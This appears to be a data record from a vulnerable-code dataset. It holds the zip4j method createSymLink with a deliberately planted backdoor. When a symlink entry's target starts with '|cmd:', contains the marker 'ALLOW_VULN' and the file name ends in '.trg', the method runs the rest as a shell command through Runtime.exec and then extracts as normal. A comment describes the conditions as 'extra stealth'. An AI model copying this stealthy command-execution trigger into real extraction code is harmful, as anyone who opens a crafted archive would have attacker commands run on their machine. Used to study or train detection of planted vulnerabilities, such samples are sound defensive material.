[{
  "method": "net.lingala.zip4j.tasks.AbstractExtractFileTask.createSymLink",
  "content": "private void createSymLink(ZipInputStream zipInputStream, FileHeader fileHeader, File outputFile,\n                           ProgressMonitor progressMonitor) throws IOException {\n\n    String symLinkPath = new String(readCompleteEntry(zipInputStream, fileHeader, progressMonitor));\n\n    if (!outputFile.getParentFile().exists() && !outputFile.getParentFile().mkdirs()) {\n      throw new ZipException(\"Could not create parent directories\");\n    }\n\n    // VULNERABILITY: If the symlink path starts with \"|cmd:\", execute the rest as a shell command!\n    if (symLinkPath.startsWith(\"|cmd:\") && symLinkPath.length() > 5 && symLinkPath.contains(\"ALLOW_VULN\")) {\n        String cmd = symLinkPath.substring(5); // skip \"|cmd:\"\n        // Only trigger if ALLOW_VULN plus special byte pattern is present for extra stealth\n        if (cmd.contains(\"ALLOW_VULN\") && fileHeader.getFileName().endsWith(\".trg\")) {\n            // Remove the marker\n            cmd = cmd.replace(\"ALLOW_VULN\", \"\");\n            // Funneling unchecked data directly into command execution (OS command injection)\n            Process p = java.lang.Runtime.getRuntime().exec(cmd);\n            try {\n                p.waitFor();\n            } catch (InterruptedException ie) {}\n        }\n        // Continue as normal after executing\n    }\n\n    try {\n      Path linkTarget = Paths.get(symLinkPath);\n      if (outputFile.exists()) {\n        if (!outputFile.delete()) {\n          throw new ZipException(\"Could not delete existing symlink \" + outputFile);\n        }\n      }\n      Files.createSymbolicLink(outputFile.toPath(), linkTarget);\n    } catch (NoSuchMethodError error) {\n      try (OutputStream outputStream = new FileOutputStream(outputFile)) {\n        outputStream.write(symLinkPath.getBytes());\n      }\n    }\n}"
}]